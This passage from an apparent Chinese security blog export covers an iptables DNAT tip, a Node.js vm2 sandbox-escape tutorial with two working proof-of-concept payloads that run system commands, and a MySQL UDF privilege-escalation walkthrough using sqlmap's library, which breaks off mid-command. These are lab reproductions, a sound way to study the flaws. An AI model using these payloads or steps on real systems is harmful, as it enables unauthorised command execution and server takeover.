<code>IP</code> 指向另一个 <code>IP</code> 呢？是的，<code>iptables</code>  可以实现这层转发。</p><ul><li><p>场景一 : 家中有一台服务器内网 IP <code>192.168.0.111</code>, 公网 IP <code>123.123.123.123</code>，你可以通过 IP <code>123.123.123.123</code>在任何地方你都可以访问到你的服务器，在家的时候你可以通过内网来访问你的服务器，当然如果你在你家的电脑把 <code>123.123.123.123</code> 指向 <code>192.168.0.111</code> 那么你依然可以用外网来访问，但是其实走的是内网流量，速度会快很多。</p></li><li><p>场景二 : 此场景源于最近装的 <code>k8s</code> 集群，由于 3 台机子不在一个内网中，所以需要用外网来建立集群。其中有参数可以配置用公网来启动集群，但是无论是阿里还是腾讯，都没有把公网绑在机子的网卡上，所以我一直启动失败。当绑定在内网上却可以启动成功，那我只能想到这个折中的方法了，因为他们内网是不通的，所以通过内网 IP 是不能访问的，可是用内网启动一定要用内网连接，那我把内网 IP 重定向到外网 IP 上不就可以了？事实证明真的成功组成了集群。当然如果有更好的解决方案也欢迎告知我。</p></li><li><p>更多使用场景请自行发掘</p></li></ul><h2 id="把外网ip映射到内网ip"><a href="#把外网ip映射到内网ip" class="headerlink" title="把外网ip映射到内网ip"></a>把外网ip映射到内网ip</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -d 123.123.123.123 -j DNAT --to-destination 192.168.0.111</span><br></pre></td></tr></table></figure><h2 id="把内网ip映射到外网ip"><a href="#把内网ip映射到外网ip" class="headerlink" title="把内网ip映射到外网ip"></a>把内网ip映射到外网ip</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -d 192.168.0.111 -j DNAT --to-destination 123.123.123.123</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> iptables </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VM2沙箱逃逸</title>
      <link href="/2023/08/25/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2023/08/25/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><ul><li><code>JavaScript</code> 和 <code>Nodejs</code> 之间有什么区别：<code>JavaScript</code> 用在浏览器前端，后来将 <code>Chrome</code> 中的 <code>v8</code> 引擎单独拿出来为 <code>JavaScript</code> 单独开发了一个运行环境，因此 <code>JavaScript</code> 也可以作为一门后端语言，写在后端（服务端）的 <code>JavaScript</code> 就叫叫做 <code>Nodejs</code> 。</li><li>什么是沙箱（ <code>sandbox</code> ）当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</li><li>沙箱（ <code>sandbox</code> ）和 虚拟机（ <code>VM</code> ）和 容器（ <code>Docker</code> ）之间的区别：<code>sandbox</code> 和 <code>VM</code> 使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。<code>Docker</code> 属于 <code>sandbox</code> 的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用 <code>Docker</code> 和<code>sandbox</code> 嵌套的方式更多一点，安全性也更高。</li><li>在 <code>Nodejs</code> 中，我们可以通过引入 <code>vm</code> 模块来创建一个“沙箱”，但其实这个 <code>vm</code> 模块的隔离功能并不完善，还有很多缺陷，因此 <code>Node</code> 后续升级了 <code>vm</code> ，也就是现在的 <code>vm2</code> 沙箱，<code>vm2</code> 引用了 <code>vm</code> 模块的功能，并在其基础上做了一些优化。</li></ul><h1 id="VM介绍"><a href="#VM介绍" class="headerlink" title="VM介绍"></a>VM介绍</h1><h2 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h2><p>在 <code>Node.js</code> 中，<code>VM(Virtual Machine)</code> 是一个用于解释和执行 <code>JavaScript</code> 代码的引擎。<code>VM</code> 是一个沙箱 ( <code>sandbox</code> ),它允许 <code>Node.js</code> 在执行脚本时限制其访问系统资源的权限，以防止脚本执行恶意代码或访问不必要的系统资源。</p><h2 id="VM2"><a href="#VM2" class="headerlink" title="VM2"></a>VM2</h2><p>由于 <code>vm</code> 不安全，能轻易地获取到了主程序的全局对象 <code>process</code> ，造成沙箱逃逸，所以有了 <code>vm2</code> 。<code>vm2</code> 基于<code>vm</code> ，使用官方的 <code>vm</code> 库构建沙箱环境。然后使用 <code>JavaScript</code> 的 <code>Proxy</code> 技术来防止沙箱脚本逃逸。</p><h1 id="VM的使用"><a href="#VM的使用" class="headerlink" title="VM的使用"></a>VM的使用</h1><p>我们首先要引入 <code>Nodejs</code> 内置的 <code>vm</code> 模块。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="在创建的虚拟机中执行代码"><a href="#在创建的虚拟机中执行代码" class="headerlink" title="在创建的虚拟机中执行代码"></a>在创建的虚拟机中执行代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">console</span>: <span class="variable language_">console</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`console.log(x);`</span>;</span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">createContext</span>(context);</span><br><span class="line">vm.<span class="title function_">runInContext</span>(code, context);</span><br></pre></td></tr></table></figure><p>这里会发现终端上会打印 <code>2</code> 这个结果。如果我们在 <code>context</code> 中没有设置 <code>console: console</code> ，那就不会在终端上打印 <code>2</code> 。这里我的理解是，由于这里执行的代码中一个新的虚拟机，那么这个虚拟机中的环境和当前的环境是不一致的，也就是虚拟机中执行的命令不会回显到当前环境中，也就不会打印在终端上。但是背地还是执行了的。</p><h2 id="在当前上下文执行代码"><a href="#在当前上下文执行代码" class="headerlink" title="在当前上下文执行代码"></a>在当前上下文执行代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);  </span><br><span class="line"><span class="variable language_">global</span>.<span class="property">x</span> = <span class="number">1</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`console.log(x);`</span>;  </span><br><span class="line">  </span><br><span class="line">vm.<span class="title function_">runInThisContext</span>(code);</span><br></pre></td></tr></table></figure><h1 id="示例说明VM模块的作用"><a href="#示例说明VM模块的作用" class="headerlink" title="示例说明VM模块的作用"></a>示例说明VM模块的作用</h1><h2 id="使用VM模块来实现一个简单的沙盒"><a href="#使用VM模块来实现一个简单的沙盒" class="headerlink" title="使用VM模块来实现一个简单的沙盒"></a>使用VM模块来实现一个简单的沙盒</h2><p>假设我们需要运行来自用户的 <code>JavaScript</code> 代码，但又不想让这些代码对我们的系统造成损害。这时，我们可以使用 <code>VM</code> 模块来实现一个简单的沙盒。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">    function add(a, b) &#123;</span></span><br><span class="line"><span class="string">        return a + b;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    console.log(add(2, 3));</span></span><br><span class="line"><span class="string">    console.log(process.argv);</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">    <span class="variable language_">console</span>,</span><br><span class="line">    <span class="attr">process</span>: &#123;</span><br><span class="line">        <span class="attr">argv</span>: [<span class="string">&#x27;node&#x27;</span>, <span class="string">&#x27;index.js&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">createContext</span>(context);</span><br><span class="line">vm.<span class="title function_">runInContext</span>(code, context);</span><br></pre></td></tr></table></figure><p>上面的代码创建了一个虚拟机上下文，并在其中执行了 <code>JavaScript</code> 代码。在上下文中，我们定义了一个 <code>console</code> 对象和一个 <code>process</code> 对象，并向 <code>process</code> 对象中添加了一个 <code>argv</code> 属性。然后，我们执行了一个包含了一个 <code>add</code> 函数和一些输出语句的 <code>JavaScript</code> 代码。这个 <code>JavaScript</code> 代码会输出 <code>5</code> 和 <code>process.argv</code> 数组。</p><p>这样，我们就成功地把用户的代码隔离在一个虚拟机中，避免了它对我们的系统造成损害。</p><h1 id="VM2沙箱逃逸-v3-9-17，CVE-2023-32314"><a href="#VM2沙箱逃逸-v3-9-17，CVE-2023-32314" class="headerlink" title="VM2沙箱逃逸( v3.9.17，CVE-2023-32314)"></a>VM2沙箱逃逸( v3.9.17，CVE-2023-32314)</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p><code>3.9.17</code> 及以下版本的 <code>vm2</code> 中存在沙盒逃逸漏洞。它滥用基于代理规范的宿主对象的意外创建，并允许<code>Function</code> 在宿主上下文中通过导致 <code>RCE</code> 。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p><code>Vm2 &lt;= 3.9.17</code> </p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="/imgs/1690893929063.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vm2@3.9.17</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">  const err = new Error();</span></span><br><span class="line"><span class="string">  err.name = &#123;</span></span><br><span class="line"><span class="string">    toString: new Proxy(() =&gt; &quot;&quot;, &#123;</span></span><br><span class="line"><span class="string">      apply(target, thiz, args) &#123;</span></span><br><span class="line"><span class="string">        const process = args.constructor.constructor(&quot;return process&quot;)();</span></span><br><span class="line"><span class="string">        throw process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">    &#125;),</span></span><br><span class="line"><span class="string">  &#125;;</span></span><br><span class="line"><span class="string">  try &#123;</span></span><br><span class="line"><span class="string">    err.stack;</span></span><br><span class="line"><span class="string">  &#125; catch (stdout) &#123;</span></span><br><span class="line"><span class="string">    stdout;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm.<span class="title function_">run</span>(code));</span><br></pre></td></tr></table></figure><p><img src="/imgs/1690893824209.png"></p><h1 id="VM2沙箱逃逸（v3-8-3）"><a href="#VM2沙箱逃逸（v3-8-3）" class="headerlink" title="VM2沙箱逃逸（v3.8.3）"></a>VM2沙箱逃逸（v3.8.3）</h1><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vm2@3.8.3</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">&#x27;(&#x27;</span> + <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">TypeError</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">get_process</span> = <span class="function"><span class="params">f</span>=&gt;</span>f.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>);</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">preventExtensions</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&quot;&quot;</span>)).<span class="property">a</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_">get_process</span>(<span class="function">()=&gt;</span>&#123;&#125;).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload</code> 来自 <code>https://github.com/patriksimek/vm2/issues/225</code> 。</p><h1 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h1><p>现在 <code>VM2</code> 这个项目作者已经不再维护了，并且作者建议我们不要在生产环境用这个项目了。因为 <code>Node</code> 日益复杂，防止 <code>Node</code> 沙箱逃逸是一件日益复杂的事情。而且主要是因为这个项目使用的防止逃逸的策略被证实是不当的，最新版本的 <code>VM2</code> 项目也存在沙箱逃逸，并且作者发现如果进一步防止沙箱逃逸需要更改整个项目的代码架构策略，因此作者选择了放弃。作者建议我们选择 <code>isolated-vm</code> 这个项目。这个项目选择了不同的思路但是一样有效的方式来防止沙箱逃逸。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://zhuanlan.zhihu.com/p/617758104</span><br><span class="line">https://pythonjishu.com/dxmuzvsyrdduifx/</span><br><span class="line">https://github.com/patriksimek/vm2/security/advisories/GHSA-7jxr-cg7f-gpgv</span><br><span class="line">https://github.com/patriksimek/vm2</span><br><span class="line">https://github.com/patriksimek/vm2/issues/225</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Nodejs </category>
          
          <category> 沙箱逃逸 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nodejs </tag>
            
            <tag> 沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL UDF提权</title>
      <link href="/2023/08/25/MySQL%20UDF%E6%8F%90%E6%9D%83/"/>
      <url>/2023/08/25/MySQL%20UDF%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p><code>UDF</code>（ <code>user defined function</code> ）用户自定义函数，是 <code>MySQL</code> 的一个扩展接口，称为用户自定义函数,是用来拓展 <code>MySQL</code> 的技术手段，用户通过自定义函数来实现在 <code>MySQL</code> 中无法实现的功能。文件后缀为 <code>.dll</code> 或 <code>.so</code> ，常用 <code>c</code> 语言编写。拿到一个 <code>WebShell</code> 之后，在利用操作系统本身存在的漏洞提权的时候发现补丁全部被修补。这个时候需要利用第三方应用提权。当 <code>MYSQL</code> &#x3D;&#x3D;权限比较高&#x3D;&#x3D; 的时候我们就可以利用 <code>udf</code> 提权。</p><blockquote><p><code>udf</code> 提权本质上并不是真正意义上的提权，只是通过当前 <strong>mysql的运行权限</strong> 去执行系统命令，如果<code>mysql</code> 运行权限太低的话同样也没有特别大的意义！！！</p></blockquote><h1 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h1><ul><li><code>mysql</code> 允许导入导出文件，也就是 <code>secure_file_priv</code> 的值为空（为空不是为 <code>NULL</code> ）</li><li>高权限用户启动，如 <code>root</code> 。该账号需要有对数据库 <code>mysql</code> 的 <code>insert</code> 和 <code>delete</code> 权限，其实是操作里面的<code>func</code> 表，所以 <code>func</code> 表也必须存在。而且这样才能有权限写入文件到目标文件夹中，不然大概率写不进去。</li><li>未开启 <code>‑‑skip‑grant‑tables</code> 。开启的情况下，<code>UDF</code> 不会被加载，默认不开启。</li></ul><blockquote><p><code>secure_file_priv</code> 是用来限制 <code>load dumpfile</code> 、<code>into outfile</code> 、<code>load_file()</code> 函数在哪个目录下拥有上传或者读取文件的权限。</p><p>当 <code>secure_file_priv</code> 的值为 <code>null</code> ，表示限制 <code>mysqld</code> 不允许导入|导出，此时无法提权；<br>当 <code>secure_file_priv</code> 的值为 <code>/tmp/</code> ，表示限制 <code>mysqld</code> 的导入|导出只能发生在 <code>/tmp/</code> 目录下，此时也无法提权；<br>当 <code>secure_file_priv</code> 的值没有具体值时，表示不对 <code>mysqld</code> 的导入|导出做限制，此时可提权。</p><p>在 <code>mysql5.5</code> 版本之前 <code>secure_file_priv</code> 这个值是默认为空的，那么我们拿到的 <code>webshell</code> 如果对应的 <code>mysql</code> 数据库版本在 <code>5.5</code> 以下的话操作起来就比较方便，在 <code>mysql5.5</code> 版本之后 <code>secure_file_priv</code> 这个值是默认为 <code>NULL</code> 的，即不能够在数据库中导入导出文件。</p></blockquote><blockquote><p>此外，<code>MySQL</code> 的默认启动用户是 <code>mysql</code> ，因此其权限比较低，需要运维配置错误给 <code>MySQL</code> 的启动用户过高的权限此漏洞才能利用成功。</p></blockquote><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>首先最基本的是要开启 <code>MySQL</code> 允许外部连接。</p><p><img src="/imgs/1692613411786.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这个版本的MySQL的secure_file_priv默认为null，也就是不允许写入，导出文件的，因此我们需要在MySQL的配置文件my.ini中修改</span><br><span class="line">mysql 5.5.62</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看secure_file_priv的配置</span><br><span class="line">show global variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure><p>默认为 <code>NULL</code> ，因此为了复现漏洞，我们需要修改这里的参数。</p><p><img src="/imgs/1692528383808.png"></p><p>参数通过 <code>my.cnf</code> 文件中修改。</p><p><img src="/imgs/1692582087186.png"></p><p>同时我们还有修改 <code>MySQL</code> 的启动用户，以 <code>root</code> 用户高权限身份启动 <code>MySQL</code> ，后面才能将 <code>udf.so</code> 上传到 <code>MySQL</code> 的 <code>plugin</code> 目录。</p><p><img src="/imgs/1692612450671.png"></p><p>修改后要重启 <code>MySQL</code> 。</p><p><img src="/imgs/1692582107204.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="判断漏洞利用前提条件"><a href="#判断漏洞利用前提条件" class="headerlink" title="判断漏洞利用前提条件"></a>判断漏洞利用前提条件</h4><p>当我们拿到 <code>MySQL</code> 的控制权后，先通过 <code>show variables like &quot;%secure_file_priv%&quot;;</code> 命令查看是否允许导入导出文件。</p><p><img src="/imgs/1692582815101.png"></p><p>再通过 <code>select * from mysql.user where user = substring_index(user(), &#39;@&#39;, 1);</code> 查看当前数据库是否高权限。</p><p><img src="/imgs/1692583067591.png"></p><h4 id="上传UDF库文件"><a href="#上传UDF库文件" class="headerlink" title="上传UDF库文件"></a>上传UDF库文件</h4><ol><li>先通过 <code>select @@basedir;</code> 命令获取 <code>MySQL</code> 的安装目录。</li></ol><p><img src="/imgs/1692609973383.png"></p><ol start="2"><li>再通过 <code>show variables like &quot;%plugin%&quot;;</code> 命令获取 <code>plugin</code> 的路径。</li></ol><p><img src="/imgs/1692583659821.png"></p><ol start="3"><li>再通过 <code>select @@version_compile_os, @@version_compile_machine;</code> 命令来查看目标机器的架构情况，依此来选择上传什么版本的 <code>UDF</code> 库文件到目标机器。</li></ol><p><img src="/imgs/1692582321050.png"></p><ol start="4"><li>再准备 <code>UDF</code> 库文件。</li></ol><ul><li>从 <code>sqlmap</code> 中获取</li></ul><p><code>sqlmap</code> 中有现成的 <code>udf</code> 文件。分别是 <code>32</code> 位和 <code>64</code> 位的。这里选择<code>sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_</code> 。</p><p>不过这里的 <code>so</code> 文件是异或过的，需要执行以下命令解密：</p><p><img src="/imgs/1692583892344%201.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/sqlmap/extra/cloak/</span><br><span class="line">python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure><p>此时会在和原本 <code>so</code> 文件相同的目录生成解密后的 <code>lib_mysqludf_sys.so</code> 文件。</p><ol start="5"><li>上传 <code>UDF</code> 文件到 <code>MySQL</code> 的插件目录中（要么是 <code>show variables like &quot;%plugin%&quot;</code> 返回的结果，要么是 <code>select @@basedir;</code> 的结果加上 <code>/lib/plugin</code> ，通过 <code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;</code> 的报错信息来获取应该上传到哪个目录。）</li></ol><p><img src="/imgs/1692612743818.png"></p><blockquote><p>如果没有这个目录，就自己手动创建一个目录。</p></blockquote><p>通过下面的命令上传文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;/usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so&#x27;) into dumpfile &#x27;/usr/local/mysql/lib/plugin/udf.so&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>但是 <code>load_file</code> 大概率无法正确返回 <code>so</code> 文件的结果，为了解决这个问题，我们可以手动复制这个文件的十六进制内容来手工导入。</p></blockquote><p><img src="/imgs/1692611648772.png"></p><p>我们可以通过 <code>xxd</code> 命令来获取二进制文件的十六进制表示，<code>-p</code> 参数表示只显示十六进制的内容，不显示其它信息。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692611897088.png"><br><code>linux-x64 payload</code> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select  into dumpfile &#x27;/usr/local/mysql/lib/plugin/udf.so&#x27;;</span><br></pre></td></tr></table></figure><p>然后就可以通过 <code>so</code> 文件加载外部函数，然后利用外部函数调用系统命令了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;</span><br><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692612275098.png"></p><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="漏洞环境搭建-1"><a href="#漏洞环境搭建-1" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>和 <code>linux</code> 基本类似，但是需要注意的是 <code>windows</code> 的 <code>phpstudy</code> 不能直接开放 <code>MySQL</code> 外部连接，需要使用下面的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to 自己的用户名@&#x27;%&#x27; identified by &#x27;密码&#x27;; </span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>然后就可以外部连接本机的 <code>MySQL</code> 了。</p><p>然后依旧是需要保持 <code>secure_file_priv</code> 的值为空。（不过这个版本 <code>5.5.29</code> 的 <code>MySQL</code> 的这个属性默认就是空的。）</p><p><img src="/imgs/1692613710480.png"></p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>还是先信息收集。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br><span class="line">show variables like &quot;%plugin%&quot;;</span><br><span class="line">select @@version_compile_os, @@version_compile_machine;</span><br><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692613923125.png"></p><p>然后在 <code>kali</code> 的 <code>sqlmap</code> 中获取 <code>windows-x64</code> 版本的 <code>udf</code> 文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/sqlmap/extra/cloak/</span><br><span class="line">python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692614087711.png"></p><p>再通过 <code>xxd</code> 命令获取 <code>payload</code> 。</p><p><img src="/imgs/1692614141853.png"></p><p><code>windows-x64</code> 的 <code>payload</code> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select into dumpfile &#x27;D:/phpstudy_pro/Extensions/MySQL5.5.29/lib/plugin/udf.dll&#x27;;</span><br></pre></td></tr></table></figure><p>然后执行下面的命令就可以成功提权了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 注意这里如果找不到这个文件，报错和linux不一样</span><br><span class="line"># windows会报错：ERROR 1126 (HY000): Can&#x27;t open shared library 